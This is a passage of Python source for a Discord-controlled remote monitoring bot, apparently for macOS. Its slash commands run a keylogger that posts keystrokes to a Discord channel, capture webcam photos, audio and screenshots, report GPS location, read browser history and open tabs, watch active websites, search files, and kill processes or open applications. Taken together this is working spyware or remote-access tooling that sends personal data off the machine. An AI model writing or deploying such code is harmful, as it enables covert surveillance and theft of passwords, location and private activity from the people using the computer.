    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    try:
        if action.value == 'start':
            if not keylogger_active:
                keylogger_active = True
                keylogger_data.clear()
                keylogger_channel = interaction.channel
                last_send_time = time.time()
                keylogger_listener = keyboard.Listener(on_press=on_key_press)
                keylogger_listener.start()
                await interaction.response.send_message("⌨️ Keylogger started - sending keystrokes every second")
            else:
                await interaction.response.send_message("Keylogger is already running")
        elif action.value == 'stop':
            if keylogger_active:
                keylogger_active = False
                if keylogger_listener:
                    keylogger_listener.stop()
                    keylogger_listener = None
                # send remaining data before stop
                if keylogger_channel and keylogger_data:
                    await interaction.response.send_message(f"```{''.join(keylogger_data)}```")
                else:
                    await interaction.response.send_message("⌨️ Keylogger stopped")
                keylogger_data.clear()
                keylogger_channel = None
            else:
                await interaction.response.send_message("Keylogger is not running")
    except Exception as e:
        logger.error(f"Error with keylogger: {str(e)}")
        await interaction.response.send_message(f"Error with keylogger: {str(e)}")

@bot.tree.command(name='sysinfo', description='Show comprehensive system information (location, battery, CPU, RAM, etc.)')
async def system_info(interaction: discord.Interaction):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    try:
        await interaction.response.defer()  # This might take a few seconds due to network requests
        info = get_system_info()
        await interaction.followup.send(f"```{info}```")
    except Exception as e:
        logger.error(f"Error getting system info: {str(e)}")
        if not interaction.response.is_done():
            await interaction.response.send_message(f"Error getting system info: {str(e)}")
        else:
            await interaction.followup.send(f"Error getting system info: {str(e)}")

@bot.tree.command(name='ip', description='Show the system IP address')
async def ip_address(interaction: discord.Interaction):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    try:
        ip = get_ip_address()
        await interaction.response.send_message(f"🌐 IP Address: {ip}")
    except Exception as e:
        logger.error(f"Error getting IP address: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error getting IP address: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error getting IP address: {str(e)}")
        except Exception:
            pass

@bot.tree.command(name='locate', description='Get precise location with GPS coordinates and timestamp')
async def locate(interaction: discord.Interaction):
    """Get current location using macOS Location Services (GPS-only)."""
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    try:
        await interaction.response.defer()  # This may take time for location services
        
        location_data = get_precise_location()
        
        if location_data['success']:
            # Format the response message
            response_lines = []
            response_lines.append(f"📍 **Location Retrieved**: {location_data['timestamp']} {location_data['timezone']}")
            response_lines.append("")
            
            if location_data['latitude'] and location_data['longitude']:
                lat = location_data['latitude']
                lon = location_data['longitude']
                
                # Format coordinates with proper precision
                response_lines.append(f"🌐 **GPS Coordinates**: {lat:.6f}, {lon:.6f}")
                
                if location_data['address']:
                    response_lines.append(f"🏠 **Address**: \n{location_data['address']}")
                
                # Add map links
                google_maps_url = f"https://maps.google.com/?q={lat},{lon}"
                apple_maps_url = f"http://maps.apple.com/?q={lat},{lon}"
                response_lines.append(f"🗺️ **Maps**: [Google Maps]({google_maps_url}) | [Apple Maps]({apple_maps_url})")
                
            else:
                response_lines.append("❌ **Coordinates**: Not available")
                if location_data['address']:
                    response_lines.append(f"🏠 **Address**: {location_data['address']}")
            
            response_text = "\n".join(response_lines)
            await interaction.followup.send(response_text)
            
        else:
            # Location failed - provide detailed setup instructions
            error_message = f"❌ **Location Failed**: {location_data['error']}\n\n"
            
            if "not found" in location_data['error']:
                error_message += "🔧 **Required Setup - Create Location Shortcut**:\n"
                error_message += "1. Open **Shortcuts** app on macOS\n"
                error_message += "2. Click **'+'** to create new shortcut\n"
                error_message += "3. Name it exactly: **'Get Location Data'**\n"
                error_message += "4. Search and add **'Get Current Location'** action\n"
                error_message += "5. Save the shortcut\n"
                error_message += "6. **Test manually**: Run shortcut to grant permissions\n"
            elif "permission" in location_data['error'].lower():
                error_message += "🔐 **Location Permission Required**:\n"
                error_message += "1. Open **System Preferences > Security & Privacy**\n"
                error_message += "2. Go to **Privacy > Location Services**\n"
                error_message += "3. Enable **Location Services** (if disabled)\n"
                error_message += "4. Find **Shortcuts** app and enable it\n"
                error_message += "5. Retry the `/locate` command\n"
            else:
                error_message += "🔧 **Troubleshooting**:\n"
                error_message += "• Ensure **Shortcuts** app is installed (macOS 12+)\n"
                error_message += "• Create shortcut named **'Get Location Data'**\n"
                error_message += "• Grant location permissions to Shortcuts app\n"
                error_message += "• Test shortcut manually before using bot\n"
            
            error_message += "\n🌍 **Note**: This command requires GPS-based location services"
            error_message += "\n🔒 **Privacy**: Location data is processed locally and sent only to Discord"
            
            await interaction.followup.send(error_message)
            
    except Exception as e:
        logger.error(f"Error in locate command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error getting location: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error getting location: {str(e)}")
        except Exception:
            pass  # If we can't send error message, just log it

@bot.tree.command(name='uptime', description='Show system uptime')
async def uptime(interaction: discord.Interaction):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    try:
        uptime_str = get_uptime()
        await interaction.response.send_message(f"⏱️ Uptime: {uptime_str}")
    except Exception as e:
        logger.error(f"Error getting uptime: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error getting uptime: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error getting uptime: {str(e)}")
        except Exception:
            pass

@bot.tree.command(name='processes', description='Show top 15 processes by CPU or RAM usage')
@discord.app_commands.describe(sort_by='Sort processes by CPU or RAM usage')
@discord.app_commands.choices(sort_by=[
    discord.app_commands.Choice(name='RAM Usage', value='ram'),
    discord.app_commands.Choice(name='CPU Usage', value='cpu')
])
async def processes(interaction: discord.Interaction, sort_by: discord.app_commands.Choice[str]):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    try:
        processes = get_top_processes(sort_by=sort_by.value, limit=15)
        
        if sort_by.value == 'cpu':
            top_processes = "Top 15 processes by CPU usage:\n"
            for proc in processes:
                pid_list = ", ".join(map(str, proc['pids']))
                cpu_percent = proc['cpu_percent']
                count_text = f" ({proc['count']} processes)" if proc['count'] > 1 else ""
                top_processes += f"**{proc['name']}**{count_text} (PID {pid_list}): {cpu_percent:.1f}%\n"
        else:  # RAM
            top_processes = "Top 15 processes by memory usage (RSS):\n"
            for proc in processes:
                pid_list = ", ".join(map(str, proc['pids']))
                mb = proc['rss'] / (1024 * 1024)
                count_text = f" ({proc['count']} processes)" if proc['count'] > 1 else ""
                top_processes += f"**{proc['name']}**{count_text} (PID {pid_list}): {mb:.2f} MB\n"
        
        await interaction.response.send_message(f"📊 ```{top_processes}```")
    except Exception as e:
        logger.error(f"Error getting processes: {str(e)}")
        await interaction.response.send_message(f"Error getting processes: {str(e)}")

@bot.tree.command(name='camera', description='Take a photo using the webcam')
async def camera(interaction: discord.Interaction):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    try:
        await interaction.response.defer()
        photo_path = take_webcam_photo()
        if photo_path:
            await interaction.followup.send("📷 Webcam photo taken", file=discord.File(photo_path))
            os.remove(photo_path)
        else:
            await interaction.followup.send("Failed to capture webcam photo")
    except Exception as e:
        logger.error(f"Error capturing from camera: {str(e)}")
        if not interaction.response.is_done():
            await interaction.response.send_message(f"Error capturing from camera: {str(e)}")
        else:
            await interaction.followup.send(f"Error capturing from camera: {str(e)}")

@bot.tree.command(name='all', description='Run all monitoring commands')
async def execute_all(interaction: discord.Interaction):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    try:
        await interaction.response.defer()
        results = []
        screenshot_path = take_screenshot()
        await interaction.followup.send("🟢 Screenshot taken", file=discord.File(screenshot_path))
        os.remove(screenshot_path)
        results.append("✓ Screenshot")
        audio_path = record_audio()
        await interaction.followup.send("🎤 Audio recorded", file=discord.File(audio_path))
        os.remove(audio_path)
        results.append("✓ Audio recording")
        system_info = get_system_info()
        await interaction.followup.send(f"```{system_info}```")
        results.append("✓ System info")
        ip = get_ip_address()
        await interaction.followup.send(f"🌐 IP Address: {ip}")
        results.append("✓ IP address")
        uptime_str = get_uptime()
        await interaction.followup.send(f"⏱️ Uptime: {uptime_str}")
        results.append("✓ Uptime")
        processes = get_top_processes(sort_by='ram', limit=15)
        top_processes = "Top 15 processes by memory usage (RSS):\n"
        for proc in processes:
            pid_list = ", ".join(map(str, proc['pids']))
            mb = proc['rss'] / (1024 * 1024)
            count_text = f" ({proc['count']} processes)" if proc['count'] > 1 else ""
            top_processes += f"**{proc['name']}**{count_text} (PID {pid_list}): {mb:.2f} MB\n"
        await interaction.followup.send(f"📊 ```{top_processes}```")
        results.append("✓ Process list")
        photo_path = take_webcam_photo()
        if photo_path:
            await interaction.followup.send("📷 Webcam photo taken", file=discord.File(photo_path))
            os.remove(photo_path)
            results.append("✓ Webcam photo")
        summary = "All functions executed:\n" + "\n".join(results)
        await interaction.followup.send(f"```{summary}```")
    except Exception as e:
        logger.error(f"Error in execute_all: {str(e)}")
        if not interaction.response.is_done():
            await interaction.response.send_message(f"Error executing all functions: {str(e)}")
        else:
            await interaction.followup.send(f"Error executing all functions: {str(e)}")

@bot.tree.command(name='find', description='Search files by filename with partial matching')
@discord.app_commands.describe(
    query='Search pattern - filename or partial filename to search for',
    path='Directory to search in (defaults to home directory)', 
    limit='Maximum number of files to return',
    depth='Maximum directory depth to search',
    include_hidden='Include hidden files and directories (default: True)'
)
async def find_files(interaction: discord.Interaction, query: str, path: str = None,
                    limit: int = 100, depth: int = 6, include_hidden: bool = True):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    try:
        await interaction.response.defer(thinking=True)
        
        # Set defaults
        search_path = path if path else FIND_DEFAULT_PATH
        
        # Validate parameters
        if limit > 2000:
            limit = 2000
        if depth > 20:
            depth = 20
            
        # Perform search
        result = await search_files_async(
            query=query,
            path=search_path, 
            mode='name_partial',
            content=None,
            limit=limit,
            depth=depth,
            include_hidden=include_hidden
        )
        
        if 'error' in result:
            await interaction.followup.send(f"❌ Search failed: {result['error']}")
            return
        
        files = result.get('results', [])
        partial = result.get('partial', False)
        message = result.get('message', '')
        
        if not files:
            await interaction.followup.send("🔍 No files matched your criteria.")
            return
        
        # Format results
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Show preview (up to 10 files)
        preview_text = f"🔍 **Found {len(files)} file{'s' if len(files) != 1 else ''}**"
        if partial:
            preview_text += f" ({message})"
        preview_text += f"\n**Search**: `{query}` in `{search_path}`\n\n"
        
        for i, file_info in enumerate(files[:10]):
            size_mb = file_info['size'] / (1024 * 1024)
            if size_mb >= 1:
                size_str = f"{size_mb:.1f}MB"
            elif file_info['size'] >= 1024:
                size_str = f"{file_info['size'] // 1024}KB"
            else:
                size_str = f"{file_info['size']}B"
            
            preview_text += f"- `{file_info['path']}` ({size_str}, {file_info['modified']})\n"
        
        if len(files) > 10:
            preview_text += f"\n... and {len(files) - 10} more files (see attachment)"
        
        # Create attachment with full results
        results_content = '\n'.join([file_info['path'] for file_info in files])
        results_filename = f"results_find_{timestamp}.txt"
        
        with open(results_filename, 'w', encoding='utf-8') as f:
            f.write(results_content)
        
        await interaction.followup.send(
            preview_text,
            file=discord.File(results_filename)
        )
        
        # Clean up
        os.remove(results_filename)
        
    except Exception as e:
        logger.error(f"Error in find command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error searching files: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error searching files: {str(e)}")
        except Exception:
            pass

@bot.tree.command(name='find-process', description='Search processes by name/PID; use before /kill')
@discord.app_commands.describe(
    name='Process name substring or regex pattern',
    pid='Exact process ID to find',
    mode='Search mode for process name matching',
    limit='Maximum number of processes to return',
    sort_by='Sort processes by the specified criteria'
)
@discord.app_commands.choices(
    mode=[
        discord.app_commands.Choice(name='Substring Match (Chrome)', value='name_substring'),
        discord.app_commands.Choice(name='Regex Pattern (python.*server)', value='name_regex')
    ],
    sort_by=[
        discord.app_commands.Choice(name='CPU Usage', value='cpu'),
        discord.app_commands.Choice(name='Memory Usage', value='mem'), 
        discord.app_commands.Choice(name='Process ID', value='pid'),
        discord.app_commands.Choice(name='Process Name', value='name')
    ]
)
async def find_process(interaction: discord.Interaction, name: str = None, pid: int = None,
                      mode: discord.app_commands.Choice[str] = None, limit: int = 15,
                      sort_by: discord.app_commands.Choice[str] = None):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    try:
        await interaction.response.defer(thinking=True)
        
        # Validate parameters
        if not name and pid is None:
            await interaction.followup.send("❌ Please provide either a process name or PID to search for.")
            return
        
        if limit > 100:
            limit = 100
            
        # Set defaults
        search_mode = mode.value if mode else 'name_substring'
        sort_criteria = sort_by.value if sort_by else 'cpu'
        
        # Perform search
        result = await search_processes_async(
            name=name,
            pid=pid,
            mode=search_mode,
            limit=limit,
            sort_by=sort_criteria
        )
        
        if 'error' in result:
            await interaction.followup.send(f"❌ Process search failed: {result['error']}")
            return
        
        processes = result.get('results', [])
        
        if not processes:
            search_term = f"PID {pid}" if pid is not None else f"name '{name}'"
            await interaction.followup.send(f"🔍 No processes found matching {search_term}.")
            return
        
        # Format results table
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Table header
        table_text = "```"
        table_text += f"{'PID':<8} {'NAME':<16} {'USER':<12} {'CPU%':<6} {'MEM_MB':<8} {'UPTIME':<8} {'CMD':<20}\n"
        table_text += "-" * 80 + "\n"
        
        # Show up to 10 processes in the preview
        for proc in processes[:10]:
            proc_name = proc['name'][:15] if len(proc['name']) > 15 else proc['name']
            username = proc['username'][:11] if len(proc['username']) > 11 else proc['username']  
            cmdline = proc['cmdline'][:19] if len(proc['cmdline']) > 19 else proc['cmdline']
            
            table_text += f"{proc['pid']:<8} {proc_name:<16} {username:<12} {proc['cpu_percent']:<6.1f} {proc['memory_mb']:<8.1f} {proc['uptime']:<8} {cmdline:<20}\n"
        
        table_text += "```"
        
        search_term = f"PID {pid}" if pid is not None else f"name '{name}'"
        response_text = f"🔍 **Found {len(processes)} process{'es' if len(processes) != 1 else ''}** matching {search_term}\n"
        response_text += f"**Sorted by**: {sort_criteria}\n\n{table_text}"
        
        if len(processes) > 10:
            response_text += f"\n... and {len(processes) - 10} more processes (see attachment)"
            
            # Create CSV attachment for full results
            csv_filename = f"processes_{timestamp}.csv"
            with open(csv_filename, 'w', encoding='utf-8') as f:
                f.write("PID,NAME,USER,CPU%,MEM_MB,UPTIME,CMD\n")
                for proc in processes:
                    f.write(f"{proc['pid']},{proc['name']},{proc['username']},{proc['cpu_percent']:.1f},{proc['memory_mb']:.1f},{proc['uptime']},{proc['cmdline']}\n")
            
            await interaction.followup.send(
                response_text,
                file=discord.File(csv_filename),
            )
            
            # Clean up
            os.remove(csv_filename)
        else:
            await interaction.followup.send(response_text)
        
    except Exception as e:
        logger.error(f"Error in find-process command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error searching processes: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error searching processes: {str(e)}")
        except Exception:
            pass


@bot.tree.command(name='kill', description='Terminate a process by PID (recommended) or name, with safety checks')
@discord.app_commands.describe(
    pid='Process ID to terminate (recommended - use /find-process first)',
    name='Process name to terminate (only if PID not provided)',
    signal='Signal type to send to the process',
    force='If TERM fails, automatically escalate to KILL after 3 seconds'
)
@discord.app_commands.choices(signal=[
    discord.app_commands.Choice(name='SIGTERM (graceful)', value='TERM'),
    discord.app_commands.Choice(name='SIGKILL (force)', value='KILL')
])
async def kill_process(interaction: discord.Interaction, pid: int = None, name: str = None,
                      signal: discord.app_commands.Choice[str] = None, force: bool = False):
    try:
        # Check if command is used in pc-monitor channel
        if not is_pc_monitor_channel(interaction):
            await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
            return
        
        # Authorization check
        guild_owner_id = interaction.guild.owner_id if interaction.guild else interaction.user.id
        if not is_authorized_user(interaction.user.id, guild_owner_id):
            await interaction.response.send_message(
                "❌ You are not authorized to use /kill.", 
            )
            return
        
        await interaction.response.defer(thinking=True)
        
        # Validate parameters
        if not pid and not name:
            await interaction.followup.send(
                "❌ Please provide either a PID or process name. Use `/find-process` to find the target process first.",
            )
            return
        
        # Set defaults
        signal_type = signal.value if signal else 'TERM'
        
        # Perform termination
        result = await terminate_process_async(
            pid=pid,
            name=name,
            signal_type=signal_type,
            force=force
        )
        
        if 'error' in result:
            await interaction.followup.send(f"❌ {result['error']}")
        elif 'success' in result:
            await interaction.followup.send(f"✅ {result['success']}")
        else:
            await interaction.followup.send("❌ Unknown error occurred during termination.")
        
    except Exception as e:
        logger.error(f"Error in kill command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error terminating process: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error terminating process: {str(e)}")
        except Exception:
            pass

@bot.tree.command(name='active-tabs', description='Show currently open browser tabs')
@discord.app_commands.describe(
    browser='Browser to check (Chrome, Safari, Firefox, etc.) or "all" for all browsers',
    limit='Maximum number of tabs to display'
)
@discord.app_commands.choices(browser=[
    discord.app_commands.Choice(name='All Browsers', value='all'),
    discord.app_commands.Choice(name='Google Chrome', value='Google Chrome'),
    discord.app_commands.Choice(name='Safari', value='Safari'),
    discord.app_commands.Choice(name='Firefox', value='Firefox'),
    discord.app_commands.Choice(name='Brave Browser', value='Brave Browser'),
    discord.app_commands.Choice(name='Microsoft Edge', value='Microsoft Edge')
])
async def active_tabs(interaction: discord.Interaction, browser: discord.app_commands.Choice[str] = None, limit: int = 20):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    
    try:
        await interaction.response.defer()
        
        browser_name = browser.value if browser else "all"
        
        # Get running browsers first
        running_browsers = get_running_browsers()
        if not running_browsers:
            await interaction.followup.send("🔍 No supported browsers are currently running.")
            return
        
        # Get tabs
        tabs = get_browser_tabs(browser_name)
        
        if not tabs:
            if browser_name == "all":
                await interaction.followup.send(f"🔍 No tabs found in running browsers: {', '.join(running_browsers)}")
            else:
                await interaction.followup.send(f"🔍 No tabs found in {browser_name} or browser is not running.")
            return
        
        # Limit results
        if limit and len(tabs) > limit:
            tabs = tabs[:limit]
            limited_msg = f" (showing first {limit})"
        else:
            limited_msg = ""
        
        # Format response
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Create preview message
        preview_text = f"🌐 **Found {len(tabs)} open tab{'s' if len(tabs) != 1 else ''}**{limited_msg}\n"
        preview_text += f"**Running browsers**: {', '.join(running_browsers)}\n\n"
        
        # Show first 5 tabs in preview
        for i, tab in enumerate(tabs[:5]):
            title = tab['title'][:60] + "..." if len(tab['title']) > 60 else tab['title']
            url = tab['url'][:80] + "..." if len(tab['url']) > 80 else tab['url']
            preview_text += f"**{tab['browser']}** - {title}\n`{url}`\n\n"
        
        if len(tabs) > 5:
            preview_text += f"... and {len(tabs) - 5} more tabs (see attachment)\n"
        
        # Create detailed file
        detailed_content = f"Active Browser Tabs - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        detailed_content += "=" * 60 + "\n\n"
        
        current_browser = None
        for tab in tabs:
            if current_browser != tab['browser']:
                current_browser = tab['browser']
                detailed_content += f"\n--- {current_browser} ---\n"
            
            detailed_content += f"Title: {tab['title']}\n"
            detailed_content += f"URL: {tab['url']}\n"
            detailed_content += f"Window: {tab.get('window', 'Unknown')}\n"
            detailed_content += "-" * 40 + "\n"
        
        # Save to file
        filename = f"active_tabs_{timestamp}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(detailed_content)
        
        # Send response
        await interaction.followup.send(
            preview_text,
            file=discord.File(filename)
        )
        
        # Cleanup
        os.remove(filename)
        
    except Exception as e:
        logger.error(f"Error in active-tabs command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error getting browser tabs: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error getting browser tabs: {str(e)}")
        except Exception:
            pass

@bot.tree.command(name='browser-history', description='Show recent browser history from databases')
@discord.app_commands.describe(
    browser='Browser to check (Chrome, Safari, Firefox) or "all" for all browsers',
    hours='Time range in hours (default: 24, max: 168)',
    limit='Maximum number of entries to display (default: 50, max: 200)'
)
@discord.app_commands.choices(browser=[
    discord.app_commands.Choice(name='All Browsers', value='all'),
    discord.app_commands.Choice(name='Google Chrome', value='Google Chrome'),
    discord.app_commands.Choice(name='Safari', value='Safari'),
    discord.app_commands.Choice(name='Firefox', value='Firefox')
])
async def browser_history(interaction: discord.Interaction, browser: discord.app_commands.Choice[str] = None, hours: int = 24, limit: int = 50):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    
    try:
        await interaction.response.defer()
        
        # Validate parameters
        if hours > 168:  # Max 1 week
            hours = 168
        if limit > 200:  # Max 200 entries
            limit = 200
        
        browser_name = browser.value if browser else "all"
        
        # Get browser history
        history = get_browser_history(browser_name, hours, limit)
        
        if not history:
            await interaction.followup.send(f"🔍 No browser history found for the last {hours} hours in {browser_name}.\n\n**Note**: This requires **Full Disk Access** permission for your terminal app in System Settings > Privacy & Security.")
            return
        
        # Format response
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Create preview message  
        preview_text = f"📚 **Found {len(history)} history entries**\n"
        preview_text += f"**Time range**: Last {hours} hours\n"
        preview_text += f"**Browser**: {browser_name}\n\n"
        
        # Show first 5 entries in preview
        for i, entry in enumerate(history[:5]):
            title = entry['title'][:50] + "..." if len(entry['title']) > 50 else entry['title']
            url = entry['url'][:70] + "..." if len(entry['url']) > 70 else entry['url']
            preview_text += f"**{entry['browser']}** - {entry['last_visit']}\n"
            preview_text += f"📄 {title}\n"
            preview_text += f"🔗 `{url}`\n"
            preview_text += f"👁️ Visits: {entry['visit_count']}\n\n"
        
        if len(history) > 5:
            preview_text += f"... and {len(history) - 5} more entries (see attachment)\n"
        
        # Add privacy warning
        preview_text += "\n⚠️ **Privacy Note**: Browser history may contain sensitive personal information."
        
        # Create detailed file
        detailed_content = f"Browser History - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        detailed_content += f"Time Range: Last {hours} hours\n"
        detailed_content += f"Browser: {browser_name}\n"
        detailed_content += "=" * 80 + "\n\n"
        
        current_browser = None
        for entry in history:
            if current_browser != entry['browser']:
                current_browser = entry['browser']
                detailed_content += f"\n--- {current_browser} ---\n"
            
            detailed_content += f"Time: {entry['last_visit']}\n"
            detailed_content += f"Title: {entry['title']}\n"
            detailed_content += f"URL: {entry['url']}\n"
            detailed_content += f"Visit Count: {entry['visit_count']}\n"
            detailed_content += "-" * 60 + "\n"
        
        # Save to file
        filename = f"browser_history_{timestamp}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(detailed_content)
        
        # Send response
        await interaction.followup.send(
            preview_text,
            file=discord.File(filename)
        )
        
        # Cleanup
        os.remove(filename)
        
    except Exception as e:
        logger.error(f"Error in browser-history command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error getting browser history: {str(e)}\n\n**Note**: This requires **Full Disk Access** permission for your terminal app.")
            else:
                await interaction.followup.send(f"❌ Error getting browser history: {str(e)}\n\n**Note**: This requires **Full Disk Access** permission for your terminal app.")
        except Exception:
            pass

@bot.tree.command(name='website-monitor', description='Monitor active website changes in real-time')
@discord.app_commands.describe(
    action='Action to perform: start monitoring, stop monitoring, or check status',
    interval='Check interval in seconds (default: 30, min: 10, max: 300)'
)
@discord.app_commands.choices(action=[
    discord.app_commands.Choice(name='Start Monitoring', value='start'),
    discord.app_commands.Choice(name='Stop Monitoring', value='stop'),
    discord.app_commands.Choice(name='Check Status', value='status')
])
async def website_monitor(interaction: discord.Interaction, action: discord.app_commands.Choice[str], interval: int = 30):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    
    try:
        action_value = action.value
        
        if action_value == 'start':
            # Validate interval
            if interval < 10:
                interval = 10
            elif interval > 300:
                interval = 300
            
            success, message = start_website_monitor(interaction.channel, interval)
            
            if success:
                current_info = get_active_website_info()
                response = f"✅ {message}\n\n"
                
                if current_info:
                    title = current_info['title'][:80] + "..." if len(current_info['title']) > 80 else current_info['title']
                    url = current_info['url'][:100] + "..." if len(current_info['url']) > 100 else current_info['url']
                    response += f"**Currently Active:**\n"
                    response += f"**Browser**: {current_info['browser']}\n"
                    response += f"**Title**: {title}\n"
                    response += f"**URL**: `{url}`"
                else:
                    response += "No active browser tabs detected."
                
                response += f"\n\n📡 Bot will notify you when the active website changes every {interval} seconds."
                response += "\n⚠️ **Privacy Note**: This will monitor all active browser tabs and URLs."
                
                await interaction.response.send_message(response)
            else:
                await interaction.response.send_message(f"❌ {message}")
        
        elif action_value == 'stop':
            success, message = stop_website_monitor()
            
            if success:
                await interaction.response.send_message(f"✅ {message}")
            else:
                await interaction.response.send_message(f"❌ {message}")
        
        elif action_value == 'status':
            global website_monitor_active
            
            if website_monitor_active:
                current_info = get_active_website_info()
                status_msg = "🟢 **Website Monitor Active**\n\n"
                
                if current_info:
                    title = current_info['title'][:80] + "..." if len(current_info['title']) > 80 else current_info['title']
                    url = current_info['url'][:100] + "..." if len(current_info['url']) > 100 else current_info['url']
                    status_msg += f"**Currently Active:**\n"
                    status_msg += f"**Browser**: {current_info['browser']}\n"
                    status_msg += f"**Title**: {title}\n"
                    status_msg += f"**URL**: `{url}`\n\n"
                else:
                    status_msg += "No active browser tabs detected.\n\n"
                
                running_browsers = get_running_browsers()
                if running_browsers:
                    status_msg += f"**Running Browsers**: {', '.join(running_browsers)}"
                else:
                    status_msg += "**Running Browsers**: None detected"
                
                await interaction.response.send_message(status_msg)
            else:
                await interaction.response.send_message("🔴 **Website Monitor Inactive**\n\nUse `/website-monitor start` to begin monitoring.")
        
    except Exception as e:
        logger.error(f"Error in website-monitor command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error with website monitor: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error with website monitor: {str(e)}")
        except Exception:
            pass

@bot.tree.command(name='open', description='Open applications, websites, files, or system utilities')
@discord.app_commands.describe(
    target='What to open (app name, URL, file path, or use quick options)',
    args='Optional arguments to pass to the application'
)
@discord.app_commands.choices(target=[
    discord.app_commands.Choice(name='🌐 Custom URL/Website', value='url'),
    discord.app_commands.Choice(name='📱 Safari Browser', value='Safari'),
    discord.app_commands.Choice(name='🌍 Google Chrome', value='Google Chrome'),
    discord.app_commands.Choice(name='🔥 Firefox', value='Firefox'),
    discord.app_commands.Choice(name='🎵 Spotify', value='Spotify'),
    discord.app_commands.Choice(name='💬 Discord', value='Discord'),
    discord.app_commands.Choice(name='💻 Visual Studio Code', value='Visual Studio Code'),
    discord.app_commands.Choice(name='🧮 Calculator', value='Calculator'),
    discord.app_commands.Choice(name='📝 Notes', value='Notes'),
    discord.app_commands.Choice(name='⚙️ System Preferences', value='System Preferences'),
    discord.app_commands.Choice(name='🖥️ Activity Monitor', value='Activity Monitor'),
    discord.app_commands.Choice(name='💻 Terminal', value='Terminal'),
    discord.app_commands.Choice(name='📁 Finder', value='Finder'),
    discord.app_commands.Choice(name='📥 Downloads Folder', value='downloads'),
    discord.app_commands.Choice(name='📄 Documents Folder', value='documents'),
    discord.app_commands.Choice(name='🖥️ Desktop Folder', value='desktop'),
    discord.app_commands.Choice(name='📱 Applications Folder', value='applications')
])
async def open_command(interaction: discord.Interaction, target: discord.app_commands.Choice[str] = None, args: str = None):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    
    try:
        await interaction.response.defer()
        
        # Handle choice-based input vs free text
        if target:
            target_value = target.value
            if target_value == 'url':
                # Ask user to provide URL in follow-up
                await interaction.followup.send("🌐 Please specify the URL you want to open. Example: `/open https://github.com` or `/open youtube.com`")
                return
        else:
            # No target provided
            await interaction.followup.send("❌ Please specify what you want to open.\n\n**Examples:**\n• `/open Safari`\n• `/open https://github.com`\n• `/open ~/Documents`\n• `/open search: python tutorials`\n• `/open pref: network`")
            return
        
        # Execute the open command
        success, message = open_target(target_value, args)
        
        if success:
            response = f"✅ {message}"
            
            # Add helpful info based on what was opened
            if is_url(target_value):
                response += f"\n🌐 Opened in default browser"
            elif target_value.lower() in ['downloads', 'documents', 'desktop', 'applications', 'home']:
                response += f"\n📁 Opened in Finder"
            elif target_value.lower().startswith(('pref:', 'preference:', 'setting:')):
                response += f"\n⚙️ System Preferences launched"
            else:
                response += f"\n📱 Application launched"
            
            await interaction.followup.send(response)
        else:
            error_response = f"❌ {message}"
            
            # Add helpful suggestions based on error type
